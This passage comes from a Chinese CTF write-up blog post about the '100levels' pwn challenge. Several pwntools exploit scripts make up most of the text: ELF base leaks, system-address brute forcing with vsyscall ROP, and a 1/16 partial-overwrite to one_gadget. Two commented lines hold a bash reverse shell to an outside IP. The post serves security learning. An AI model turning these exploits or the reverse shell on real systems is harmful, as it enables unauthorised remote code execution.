levels?\n"</span>)</span><br><span class="line">	sl(str(first))</span><br><span class="line">	ru(<span class="string">"Any more?\n"</span>)</span><br><span class="line">	sl(str(more))</span><br><span class="line"></span><br><span class="line">go(<span class="number">2</span>,<span class="number">0</span>)</span><br><span class="line">ru(<span class="string">'Answer:'</span>)</span><br><span class="line">s((<span class="string">'0\n'</span>).ljust(<span class="number">0x30</span>, <span class="string">'\x00'</span>) + <span class="string">'\x00'</span>)</span><br><span class="line">ru(<span class="string">"Question: "</span>)</span><br><span class="line">c = int(ru(<span class="string">' * '</span>))</span><br><span class="line">z = int(ru(<span class="string">' = '</span>))</span><br><span class="line">elf.address = u64(p32(z) + p32(c)) &amp; <span class="number">0xfffffffff000</span><span class="comment">#leak elf base</span></span><br><span class="line"><span class="keyword">print</span> hex(elf.address)</span><br><span class="line">ru(<span class="string">'Answer:'</span>)</span><br><span class="line">c=<span class="string">''</span></span><br><span class="line">c=c.ljust(<span class="number">0x8</span>*<span class="number">5</span>)</span><br><span class="line">c+=p64(elf.address+<span class="number">0xf47</span>)<span class="comment">#main</span></span><br><span class="line">sl(c)</span><br><span class="line"></span><br><span class="line">hint()</span><br><span class="line">go(<span class="number">0</span>,one_gadget - libc.symbols[<span class="string">'system'</span>])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">99</span>):</span><br><span class="line">	ru(<span class="string">"Question: "</span>)</span><br><span class="line">	a=int(ru(<span class="string">'*'</span>)[:<span class="number">-1</span>])</span><br><span class="line">	b=int(ru(<span class="string">'='</span>)[:<span class="number">-1</span>])</span><br><span class="line">	ru(<span class="string">'Answer:'</span>)</span><br><span class="line">	sl(str(a*b))</span><br><span class="line">ru(<span class="string">'Answer:'</span>)</span><br><span class="line">c=<span class="string">''</span></span><br><span class="line">c=c.ljust(<span class="number">0x8</span>*<span class="number">7</span>)</span><br><span class="line">c+=p64(elf.address+<span class="number">0x1030</span>)<span class="comment">#gadget</span></span><br><span class="line">s(c)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="方法3-爆破system地址-vsyscall构造ROP"><a href="#方法3-爆破system地址-vsyscall构造ROP" class="headerlink" title="方法3-爆破system地址+vsyscall构造ROP"></a>方法3-爆破system地址+vsyscall构造ROP</h4><p>在网上找到的脚本，爆破了system的地址。</p>
<p>不过这个题目里的游戏只让你玩一次，无论失败还是成功都会exit(0)，所以得通过vsyscall回到main函数。</p>
<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20191104182004.png" alt=""></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./100levels'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hint</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'Choice:'</span>,<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">go</span><span class="params">(first,more)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Choice:\n"</span>)</span><br><span class="line">	p.sendline(<span class="string">'1'</span>)	</span><br><span class="line">	p.recvuntil(<span class="string">"How many levels?\n"</span>)</span><br><span class="line">	p.sendline(str(first))</span><br><span class="line">	p.recvuntil(<span class="string">"Any more?\n"</span>)</span><br><span class="line">	p.sendline(str(more))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc</span><span class="params">(num)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Answer:'</span>)</span><br><span class="line">    p.send(num)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">()</span>:</span>   </span><br><span class="line">    start = <span class="number">0x700000000390</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>,<span class="number">2</span>,<span class="number">-1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">15</span>,<span class="number">-1</span>,<span class="number">-1</span>):</span><br><span class="line">            hint()</span><br><span class="line">            addr_test = (<span class="number">1</span> &lt;&lt; (i*<span class="number">4</span>) )* j + start</span><br><span class="line">            go(<span class="number">0</span>,-addr_test)</span><br><span class="line">            a = p.recvline()</span><br><span class="line">            <span class="comment">#print hex(addr_test)</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">'Coward'</span> <span class="keyword">not</span> <span class="keyword">in</span> a:</span><br><span class="line">                start = addr_test</span><br><span class="line">                log.info(<span class="string">'check '</span>+ hex(addr_test))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        pro = log.progress(<span class="string">'go'</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">99</span>):</span><br><span class="line">            pro.status(<span class="string">'level %d'</span>%(i+<span class="number">1</span>))</span><br><span class="line">            calc(p64(<span class="number">0</span>)*<span class="number">5</span>)</span><br><span class="line">        calc(p64(<span class="number">0xffffffffff600400</span>)*<span class="number">35</span>)<span class="comment">#vsyscall</span></span><br><span class="line">        pro.success(<span class="string">'ok'</span>)</span><br><span class="line">    <span class="keyword">return</span> start + <span class="number">0x1000</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">system_addr = leak()</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] get system addr:'</span>, hex(system_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">system_addr_libc = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">bin_sh_addr_libc = next(libc.search(<span class="string">'/bin/sh'</span>))</span><br><span class="line"></span><br><span class="line">bin_sh_addr = bin_sh_addr_libc + system_addr - system_addr_libc</span><br><span class="line"></span><br><span class="line">gadget = system_addr - system_addr_libc + <span class="number">0x21102</span><span class="comment">#pop rdi ret</span></span><br><span class="line"></span><br><span class="line">payload = p64(gadget) + p64(bin_sh_addr) + p64(system_addr)</span><br><span class="line"></span><br><span class="line">go(<span class="number">1</span>,<span class="number">0</span>)</span><br><span class="line">exp = <span class="string">'a'</span>*<span class="number">0x38</span> + payload</span><br><span class="line">calc(exp)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20191104182332.png" alt=""></p>
<h4 id="方法4-爆破elf-myexp-1-16"><a href="#方法4-爆破elf-myexp-1-16" class="headerlink" title="方法4-爆破elf-myexp 1/16"></a>方法4-爆破elf-myexp 1/16</h4><p>栈中提前存好one_gadget的地址，改写level函数返回地址的后两个字节为pop pop ret的gadegt，有1/16的几率猜对，就能ret到one_gadget。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug =<span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">	<span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">	io = process(<span class="string">'./100levels'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	io = remote(<span class="string">"111.198.29.45"</span>,<span class="number">44322</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./100levels'</span>)</span><br><span class="line">s       = <span class="keyword">lambda</span> data               :io.send(str(data)) </span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :io.sendafter(str(delim), str(data))</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :io.sendline(str(data))</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :io.sendlineafter(str(delim), str(data))</span><br><span class="line">r       = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :io.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :io.recvuntil(delims, drop)</span><br><span class="line"></span><br><span class="line">one_gadgets_ti = [<span class="number">0x4526a</span>,<span class="number">0xef6c4</span>,<span class="number">0xf0567</span>]</span><br><span class="line">one_gadgets=[<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">one_gadget=<span class="number">0x4526a</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hint</span><span class="params">()</span>:</span></span><br><span class="line">    sla(<span class="string">'Choice:'</span>,<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">go</span><span class="params">(first,more)</span>:</span></span><br><span class="line">	ru(<span class="string">"Choice:\n"</span>)</span><br><span class="line">	sl(<span class="string">'1'</span>)	</span><br><span class="line">	ru(<span class="string">"How many levels?\n"</span>)</span><br><span class="line">	sl(str(first))</span><br><span class="line">	ru(<span class="string">"Any more?\n"</span>)</span><br><span class="line">	sl(str(more))</span><br><span class="line">	</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		hint()</span><br><span class="line">		go(<span class="number">0</span>,one_gadget - libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">99</span>):</span><br><span class="line">			ru(<span class="string">"Question: "</span>)</span><br><span class="line">			a=int(ru(<span class="string">'*'</span>)[:<span class="number">-1</span>])</span><br><span class="line">			b=int(ru(<span class="string">'='</span>)[:<span class="number">-1</span>])</span><br><span class="line">			ru(<span class="string">'Answer:'</span>)</span><br><span class="line">			sl(str(a*b))</span><br><span class="line">		ru(<span class="string">'Answer:'</span>)</span><br><span class="line">		<span class="comment">#1030 </span></span><br><span class="line">		<span class="comment">#c='\x0a'+"bash -c 'sh -i &amp;&gt;/dev/tcp/47.93.101.26/6666 0&gt;&amp;1'"</span></span><br><span class="line">		c=<span class="string">''</span></span><br><span class="line">		c=c.ljust(<span class="number">0x8</span>*<span class="number">7</span>)</span><br><span class="line">		c+=<span class="string">'\x31\x50'</span><span class="comment">#1/16</span></span><br><span class="line">		s(c)</span><br><span class="line">		io.interactive()</span><br><span class="line">	<span class="keyword">except</span>:</span><br><span class="line">		io.close()</span><br><span class="line">		io = process(<span class="string">'./100levels'</span>)</span><br></pre></td></tr></table></figure>

<p>PS:得按空格才能继续运行下一个进程，咋写能写一个真正自动化的呢:(</p>
<h4 id="失败的exp"><a href="#失败的exp" class="headerlink" title="失败的exp"></a>失败的exp</h4><p>本来想以栈中的变量buf作为system的参数，因为在level函数返回的时候buf的地址在rdi里，然后ret到pop pop ret就ret到了system函数，然而失败了。后来分析是因为栈里的内容是变了的，因为buf的地址在栈顶的上面。但我又不能既为了让buf不变而抬高栈顶，又ret到栈底的system，所以这种方法是行不通了的。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug =<span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">	context.log_level = <span class="string">'debug'</span></span><br><span class="line">	io = process(<span class="string">'./100levels'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	io=remote(<span class="string">"111.198.29.45"</span>,<span class="number">44322</span>)</span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :io.send(str(data)) </span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :io.sendafter(str(delim), str(data))</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :io.sendline(str(data))</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :io.sendlineafter(str(delim), str(data))</span><br><span class="line">r       = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :io.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :io.recvuntil(delims, drop)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hint</span><span class="params">()</span>:</span></span><br><span class="line">    sla(<span class="string">'Choice:'</span>,<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">go</span><span class="params">(first,more)</span>:</span></span><br><span class="line">	ru(<span class="string">"Choice:\n"</span>)</span><br><span class="line">	sl(<span class="string">'1'</span>)	</span><br><span class="line">	ru(<span class="string">"How many levels?\n"</span>)</span><br><span class="line">	sl(str(first))</span><br><span class="line">	ru(<span class="string">"Any more?\n"</span>)</span><br><span class="line">	sl(str(more))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">()</span>:</span></span><br><span class="line">	hint()</span><br><span class="line">	go(<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">99</span>):</span><br><span class="line">		ru(<span class="string">"Question: "</span>)</span><br><span class="line">		a=int(ru(<span class="string">'*'</span>)[:<span class="number">-1</span>])</span><br><span class="line">		b=int(ru(<span class="string">'='</span>)[:<span class="number">-1</span>])</span><br><span class="line">		ru(<span class="string">'Answer:'</span>)</span><br><span class="line">		sl(str(a*b))</span><br><span class="line">	gdb.attach(io)</span><br><span class="line">	ru(<span class="string">'Answer:'</span>)</span><br><span class="line">	<span class="comment">#1030 </span></span><br><span class="line">	<span class="comment">#c='\x0a'+"bash -c 'sh -i &amp;&gt;/dev/tcp/47.93.101.26/6666 0&gt;&amp;1'"</span></span><br><span class="line">	c=str(a*b)+<span class="string">'\x0a'</span>+<span class="string">"/bin/sh\x00"</span></span><br><span class="line">	c=c.ljust(<span class="number">0x8</span>*<span class="number">7</span>)</span><br><span class="line">	c+=<span class="string">'\x31\x50'</span><span class="comment">#aslr off</span></span><br><span class="line">	s(c)</span><br><span class="line"></span><br><span class="line">pwn()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20191102203520.png" alt=""></p>
<p>rdi放着的是栈的地址，当后面执行的时候栈中的内容会变的。</p>
</div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2019-09-30</span><i class="fa fa-tag"></i><a class="tag" href="/tags/PWN/" title="PWN">PWN </a></div></div></div></div><div class="share"><div class="evernote"><a class="fa fa-bookmark" href="javascript:(function(){EN_CLIP_HOST='http://www.evernote.com';try{var%20x=document.createElement('SCRIPT');x.type='text/javascript';x.src=EN_CLIP_HOST+'/public/bookmarkClipper.js?'+(new%20Date().getTime()/100000);document.getElementsByTagName('head')[0].appendChild(x);}catch(e){location.href=EN_CLIP_HOST+'/clip.action?url='+encodeURIComponent(location.href)+'&amp;title='+encodeURIComponent(document.title);}})();" ref="nofollow" target="_blank"></a></div><div class="weibo"><a class="fa fa-weibo" href="javascript:void((function(s,d,e){try{}catch(e){}var f='http://service.weibo.com/share/share.php?',u=d.location.href,p=['url=',e(u),'&amp;title=',e(d.title),'&amp;appkey=2924220432'].join('');function a(){if(!window.open([f,p].join(''),'mb',['toolbar=0,status=0,resizable=1,width=620,height=450,left=',(s.width-620)/2,',top=',(s.height-450)/2].join('')))u.href=[f,p].join('');};if(/Firefox/.test(navigator.userAgent)){setTimeout(a,0)}else{a()}})(screen,document,encodeURIComponent));"></a></div><div class="twitter"><a class="fa fa-twitter" href="http://twitter.com/home?status=,http://q1iq.top/xman-wp/,Q1IQ,xman wp,;" target="_blank" rel="noopener"></a></div></div><div class="pagination"><ul class="clearfix"><li class="pre pagbuttons"><a class="btn" role="navigation" href="/overlap%E6%96%B9%E6%B3%95%E5%B0%8F%E7%BB%93/" title="overlap方法小结">Post Anterior</a></li><li class="next pagbuttons"><a class="btn" role="navigation" href="/ByteCtf-note_five%E4%B8%A4%E7%A7%8D%E8%A7%A3%E6%B3%95/" title="ByteCtf note_five两种解法">Próximo post</a></li></ul></div></div></div></div></div><script src="/js/jquery.js"></script><script src="/js/jquery-migrate-1.2.1.min.js"></script><script src="/js/jquery.appear.js"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":true,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"left","width":200,"height":400,"hOffset":400,"vOffset":0},"mobile":{"show":false},"react":{"opacity":0.7},"log":false});</script></body></html>